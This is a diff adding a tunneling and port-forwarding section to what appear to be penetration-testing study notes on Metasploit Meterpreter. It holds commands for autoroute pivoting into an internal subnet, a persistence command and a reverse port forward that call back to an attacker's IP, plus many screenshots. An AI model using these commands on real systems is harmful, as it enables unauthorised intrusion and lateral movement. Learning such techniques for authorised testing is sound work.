@@ -772,3 +772,110 @@ run persistence -X -i 5 -p 4444 -r <your-ip>
 # -r <IP>: Replace IP with attacker's IP. 
 ```
 {% endcode %}
+
+## Tunneling
+
+<details>
+
+<summary><strong>Getting reverse shell</strong></summary>
+
+<figure><img src="../../.gitbook/assets/image (1769).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+We've meterpreter session to `Ubuntu`.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1770).png" alt=""><figcaption></figcaption></figure>
+
+### Finding Hosts using Session&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1771).png" alt=""><figcaption></figcaption></figure>
+
+### Configure MSF's SOCKS Proxy&#x20;
+
+#### Start MSF's SOCKS proxy&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1772).png" alt=""><figcaption></figcaption></figure>
+
+#### Configure proxychains to use MSF's SOCKS proxy port&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1773).png" alt=""><figcaption></figcaption></figure>
+
+### Create Routes&#x20;
+
+#### 1. Using autoroute module
+
+{% code overflow="wrap" %}
+```bash
+use post/multi/manage/autoroute
+set SESSION <session id>
+set SUBNET <subnet> 
+run
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1774).png" alt=""><figcaption></figcaption></figure>
+
+#### 2. Automatically finding and doing stuffs&#x20;
+
+{% code overflow="wrap" %}
+```bash
+run autoroute -p
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1778).png" alt=""><figcaption></figcaption></figure>
+
+#### 3. Set Route on your own&#x20;
+
+{% code overflow="wrap" %}
+```bash
+run autoroute -s 192.168.16.0/24
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1779).png" alt=""><figcaption></figcaption></figure>
+
+### Check Available Routes&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1777).png" alt=""><figcaption></figcaption></figure>
+
+### Accessing Restricted Subnet&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1776).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1775).png" alt=""><figcaption></figcaption></figure>
+
+## Port Forwarding&#x20;
+
+### Local Port Forward&#x20;
+
+{% code overflow="wrap" %}
+```bash
+portfwd add -l 3300 -p 3389 -r 192.168.16.111
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1780).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1781).png" alt=""><figcaption></figcaption></figure>
+
+### Reverse Port Forward&#x20;
+
+{% code overflow="wrap" %}
+```bash
+portfwd add -R -l 9090 -p 5050 -L <attack box/attacker ip>
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1782).png" alt=""><figcaption></figcaption></figure>
+
+<details>
+
+<summary><strong>Intermediate Process</strong></summary>
+
+<figure><img src="../../.gitbook/assets/image (1783).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+<figure><img src="../../.gitbook/assets/image (1784).png" alt=""><figcaption></figcaption></figure>
